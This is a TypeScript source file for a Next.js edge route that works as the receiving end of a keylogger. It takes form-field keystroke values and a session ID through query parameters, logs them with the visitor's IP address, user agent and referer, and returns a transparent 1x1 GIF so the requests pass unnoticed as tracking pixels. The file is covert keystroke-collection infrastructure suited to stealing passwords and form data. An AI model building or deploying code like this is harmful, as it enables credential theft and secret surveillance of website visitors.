import { NextRequest } from 'next/server';
import { logger } from '../../../utils/lib/logger';
import { createTransparentGif } from '../../../utils/api';

export const runtime = 'edge';

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const field = searchParams.get('field');
  const val = searchParams.get('val');
  const sessionId = searchParams.get('session');
  
  // Log the keystroke with session tracking
  await logger({
    type: 'keystroke',
    timestamp: new Date().toISOString(),
    field,
    value: val,
    sessionId,
    userAgent: request.headers.get('user-agent'),
    referer: request.headers.get('referer'),
    ip: request.headers.get('x-forwarded-for') || 'unknown'
  });
  
  // Return 1x1 transparent GIF
  const transparentGif = createTransparentGif();
  
  return new Response(transparentGif, {
    headers: {
      'Content-Type': 'image/gif',
      'Cache-Control': 'no-cache, no-store, must-revalidate'
    }
  });
}